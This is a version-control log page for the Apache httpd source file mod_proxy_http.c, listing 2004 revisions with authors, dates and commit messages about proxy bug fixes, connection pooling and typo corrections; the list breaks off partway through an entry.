([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=111858&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=111858&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=111858))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=111858)

Modified
*Tue Dec 14 18:58:25 2004 UTC*
(20 years, 1 month ago)
by *jwoolley*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=111858)

File length: 51434 byte(s)

Diff to [previous 111830](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=111830&r2=111858)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=111830&r2=111858&diff_format=h))
```
"transfered" is not a word.

s/transfered/transferred/g;

```

---

Revision [**111830**](/viewvc?view=revision&revision=111830) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=111830&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=111830&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=111830))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=111830)

Modified
*Tue Dec 14 16:08:55 2004 UTC*
(20 years, 1 month ago)
by *jim*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=111830)

File length: 51425 byte(s)

Diff to [previous 111827](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=111827&r2=111830)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=111827&r2=111830&diff_format=h))
```
grammatical parameter change... "readed" -> "read"

```

---

Revision [**111827**](/viewvc?view=revision&revision=111827) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=111827&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=111827&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=111827))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=111827)

Modified
*Tue Dec 14 15:45:19 2004 UTC*
(20 years, 1 month ago)
by *mturk*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=111827)

File length: 51429 byte(s)

Diff to [previous 106103](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=106103&r2=111827)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=106103&r2=111827&diff_format=h))
```
Make proxy address cache thread safe and available only
to pooled workers.

```

---

Revision [**106103**](/viewvc?view=revision&revision=106103) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=106103&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=106103&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=106103))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=106103)

Modified
*Sun Nov 21 18:50:36 2004 UTC*
(20 years, 2 months ago)
by *nd*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=106103)

File length: 51477 byte(s)

Diff to [previous 105752](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=105752&r2=106103)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=105752&r2=106103&diff_format=h))
```
general property cleanup

```

---

Revision [**105752**](/viewvc?view=revision&revision=105752) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=105752&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=105752&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=105752))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=105752)

Modified
*Thu Nov 11 20:06:20 2004 UTC*
(20 years, 2 months ago)
by *jorton*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=105752)

File length: 51477 byte(s)

Diff to [previous 105751](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=105751&r2=105752)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=105751&r2=105752&diff_format=h))
```
* modules/proxy/proxy_http.c (ap_proxy_http_process_response): Don't treat
the 205 status-code like 204 or 304, per recent http-wg discussion:
<http://lists.w3.org/Archives/Public/ietf-http-wg/2004JulSep/0083.html>

```

---

Revision [**105751**](/viewvc?view=revision&revision=105751) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=105751&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=105751&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=105751))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=105751)

Modified
*Thu Nov 11 19:49:56 2004 UTC*
(20 years, 2 months ago)
by *jorton*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=105751)

File length: 51606 byte(s)

Diff to [previous 105645](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=105645&r2=105751)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=105645&r2=105751&diff_format=h))
```
* modules/proxy/proxy_http.c (ap_proxy_http_process_response): Use the
standard non-blocking-read/flush/blocking-read logic to ensure that
buffered content is flushed to the client if the next read will block.

PR: 19954

```

---

Revision [**105645**](/viewvc?view=revision&revision=105645) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=105645&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=105645&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=105645))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=105645)

Modified
*Sun Oct 31 16:21:19 2004 UTC*
(20 years, 2 months ago)
by *mturk*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=105645)

File length: 50536 byte(s)

Diff to [previous 105294](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=105294&r2=105645)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=105294&r2=105645&diff_format=h))
```
Remove double calculation of tranfered bytes to backend.

```

---

Revision [**105294**](/viewvc?view=revision&revision=105294) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=105294&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=105294&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=105294))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=105294)

Modified
*Sun Sep 26 06:56:24 2004 UTC*
(20 years, 4 months ago)
by *mturk*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=105294)

File length: 50583 byte(s)

Diff to [previous 105120](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=105120&r2=105294)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=105120&r2=105294&diff_format=h))
```
Count the bytes trasfered and readed so we can display the actual
data traffic, and add additional balancer mechanism that will use the
data traffic into account.

```

---

Revision [**105120**](/viewvc?view=revision&revision=105120) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=105120&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=105120&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=105120))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=105120)

Modified
*Tue Sep 14 18:54:32 2004 UTC*
(20 years, 4 months ago)
by *jorton*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=105120)

File length: 50070 byte(s)

Diff to [previous 105108](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=105108&r2=105120)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=105108&r2=105120&diff_format=h))
```
* modules/proxy/proxy_http.c (proxy_http_handler, proxy_http_canon):
Drop ap_ prefix, declarations and make static.

```

---

Revision [**105108**](/viewvc?view=revision&revision=105108) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=105108&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=105108&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=105108))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=105108)

Modified
*Mon Sep 13 11:13:28 2004 UTC*
(20 years, 4 months ago)
by *mturk*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=105108)

File length: 50334 byte(s)

Diff to [previous 105051](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=105051&r2=105108)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=105051&r2=105108&diff_format=h))
```
Always use prive connection pool for allocation, and call
apr_pool_clear when the connection is closed on recycle, so
that we don't leak on persistent connections.

```

---

Revision [**105051**](/viewvc?view=revision&revision=105051) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=105051&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=105051&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=105051))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=105051)

Modified
*Thu Sep 9 16:22:23 2004 UTC*
(20 years, 4 months ago)
by *mturk*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=105051)

File length: 50343 byte(s)

Diff to [previous 104926](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=104926&r2=105051)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=104926&r2=105051&diff_format=h))
```
If any of steps return status != OK close the connection
and call the proxy_http_cleanup.

```

---

Revision [**104926**](/viewvc?view=revision&revision=104926) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=104926&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=104926&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=104926))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=104926)

Modified
*Wed Sep 1 17:21:53 2004 UTC*
(20 years, 4 months ago)
by *jerenkrantz*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=104926)

File length: 50338 byte(s)

Diff to [previous 104783](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=104783&r2=104926)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=104783&r2=104926&diff_format=h))
```
Fix a trio of bugs in how mod_proxy relays requests:

- Fix type error in proxy-sendchunks case that caused an invalid T-E header.
- Fix data corruption (seen with mod_ssl/mod_proxy combination) due to not
  properly setting aside the body_buckets.
- Pass along a C-L: 0 if we still have a C-L of 0 after filtering and the
  original request to us had that as well.

```

---

Revision [**104783**](/viewvc?view=revision&revision=104783) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=104783&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=104783&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=104783))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=104783)

Modified
*Tue Aug 24 08:24:18 2004 UTC*
(20 years, 5 months ago)
by *mturk*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=104783)

File length: 49261 byte(s)

Diff to [previous 104645](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=104645&r2=104783)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=104645&r2=104783&diff_format=h))
```
Use ap_str_tolower for lowercasing the scheme.
That was the original intention (not apr_tolower).

```

---

Revision [**104645**](/viewvc?view=revision&revision=104645) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=104645&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=104645&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=104645))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=104645)

Modified
*Fri Aug 13 12:15:46 2004 UTC*
(20 years, 5 months ago)
by *trawick*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=104645)

File length: 49328 byte(s)

Diff to [previous 104623](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=104623&r2=104645)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=104623&r2=104645&diff_format=h))
```
apr_tolower() doesn't process the entire string

```

---

Revision [**104623**](/viewvc?view=revision&revision=104623) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=104623&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=104623&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=104623))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=104623)

Modified
*Wed Aug 11 23:09:17 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=104623)

File length: 49252 byte(s)

Diff to [previous 104603](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=104603&r2=104623)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=104603&r2=104623&diff_format=h))
```
Make sure that the things get logged using the same look-and-feal.
Also fix the return code from DECLINED to service unavailable if the connection breaks.

Submitted by: mturk

```

---

Revision [**104603**](/viewvc?view=revision&revision=104603) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=104603&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=104603&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=104603))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=104603)

Modified
*Wed Aug 11 22:45:08 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=104603)

File length: 49018 byte(s)

Diff to [previous 104602](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=104602&r2=104603)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=104602&r2=104603&diff_format=h))
```
Always use the cleanup. Do not close the socket directly.

Submitted by: mturk

```

---

Revision [**104602**](/viewvc?view=revision&revision=104602) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=104602&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=104602&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=104602))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=104602)

Modified
*Wed Aug 11 22:44:38 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=104602)

File length: 49162 byte(s)

Diff to [previous 104601](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=104601&r2=104602)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=104601&r2=104602&diff_format=h))
```
Fix the assertion bug for reslist caused by returning the
same connection back to the pool twice.

Submitted by: mturk

```

---

Revision [**104601**](/viewvc?view=revision&revision=104601) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=104601&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=104601&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=104601))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=104601)

Modified
*Wed Aug 11 22:43:44 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=104601)

File length: 49273 byte(s)

Diff to [previous 104153](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=104153&r2=104601)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=104153&r2=104601&diff_format=h))
```
We have a proxy-http using connection pool ;)
Need some thorough testing.

Submitted by: mturk

```

---

Revision [**104153**](/viewvc?view=revision&revision=104153) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=104153&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=104153&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=104153))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=104153)

Modified
*Sat Jul 3 16:23:09 2004 UTC*
(20 years, 6 months ago)
by *nd*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=104153)

File length: 57604 byte(s)

Diff to [previous 104081](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=104081&r2=104153)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=104081&r2=104153&diff_format=h))
```
fix a bunch of compiler warnings

```

---

Revision [**104081**](/viewvc?view=revision&revision=104081) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=104081&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=104081&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=104081))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=104081)

Modified
*Tue Jun 29 14:00:07 2004 UTC*
(20 years, 7 months ago)
by *martin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=104081)

File length: 57574 byte(s)

Diff to [previous 104070](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=104070&r2=104081)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=104070&r2=104081&diff_format=h))
```
*** Patch for EBCDIC-host and HTTP/0.9 responses only ***
In dealing with a HTTP/0.9 response to a proxy request, we have pre-read
data that is not an HTTP header. At this point of processing, we don't
know yet whether the data is going to be interpreted an binary or not.
(In fact, we may never find out because HTTP/0.9 lacks the Content-Type
headers; only by configuring mod_charset_lite can we control the conversion).
But mod_charset_lite will get control only later, so it cannot decide on
the conversion of the current buffer full of data.
=> This is an extreme and rare situation normally.
So, for catching the most obvious problem (talking not to a HTTP server
but to some other protocol), the best guess here is to treat the buffer
as "text/*" (to make error messages readable).

```

---

Revision [**104070**](/viewvc?view=revision&revision=104070) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=104070&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=104070&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=104070))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=104070)

Modified
*Tue Jun 29 06:37:21 2004 UTC*
(20 years, 7 months ago)
by *niq*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=104070)

File length: 56983 byte(s)

Diff to [previous 103698](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=103698&r2=104070)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=103698&r2=104070&diff_format=h))
```
Fix for multiple proxy bugs - review please:

#10722  Reverse proxying cookies
#15207  Proxy passing canonicalised URIs to backend
#16812  Case-insensitivity of proxypassreverse
#19317  Canonicalised URI causing infinite loop
#20372  AllowEncodedSlashes
May also fix 13577 (untested)

This is really two fixes: 10722 and 15207; the others are trivial consequences.
To make review easier, the simpler fix (#15207) is entirely contained in
#ifdef FIX_15207 (new code) and
#ifndef FIX_15207 (removed code)

```

---

Revision [**103698**](/viewvc?view=revision&revision=103698) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=103698&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=103698&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=103698))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=103698)

Modified
*Wed May 19 13:30:14 2004 UTC*
(20 years, 8 months ago)
by *trawick*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=103698)

File length: 49753 byte(s)

Diff to [previous 103639](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=103639&r2=103698)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=103639&r2=103698&diff_format=h))
```
Fix handling of IPv6 numeric strings in mod_proxy.

(Some such operations would work if port was specified
in url due to way parsing was performed, finding last ':'
and considering everything after as the port.)

```

---

Revision [**103639**](/viewvc?view=revision&revision=103639) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=103639&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=103639&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=103639))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=103639)

Modified
*Mon May 10 13:58:56 2004 UTC*
(20 years, 8 months ago)
by *jim*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=103639)

File length: 49482 byte(s)

Diff to [previous 102935](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102935&r2=103639)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102935&r2=103639&diff_format=h))
```
*** empty log message ***

```

---

Revision [**102935**](/viewvc?view=revision&revision=102935) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102935&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102935&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=102935))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=102935)

Modified
*Thu Mar 11 17:21:47 2004 UTC*
(20 years, 10 months ago)
by *jorton*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=102935)

File length: 48407 byte(s)

Diff to [previous 102618](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102618&r2=102935)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102618&r2=102935&diff_format=h))
```
* modules/proxy/proxy_http.c (ap_proxy_http_process_response):
Consistently check whether r->status is "successful" or not; fix
screwy handling of 2xx-but-not-200 responses when ProxyErrorOverride
is used.

PR: 20183
Submitted by: Marcus Janson <marcus.janson@tre.se>, Joe Orton

```

---

Revision [**102618**](/viewvc?view=revision&revision=102618) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102618&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102618&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=102618))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=102618)

Modified
*Mon Feb 9 20:31:03 2004 UTC*
(20 years, 11 months ago)
by *nd*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=102618)

File length: 48392 byte(s)

Diff to [previous 102572](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102572&r2=102618)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102572&r2=102618&diff_format=h))
```
fix name of The Apache Software Foundation

```

---

Revision [**102572**](/viewvc?view=revision&revision=102572) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102572&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102572&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=102572))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=102572)

Modified
*Sun Feb 8 12:27:14 2004 UTC*
(20 years, 11 months ago)
by *nd*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=102572)

File length: 48388 byte(s)

Diff to [previous 102525](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102525&r2=102572)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=102525&r2=102572&diff_format=h))
```
fix copyright dates according to the first check in

```

---

Revision [**102525**](/viewvc?view=revision&revision=102525) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102525&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=102525&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=102525))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=102525)

Modified
*Fri Feb 6 22:58:42 2004 UTC*
(20 years, 11 months ago)
by *nd*

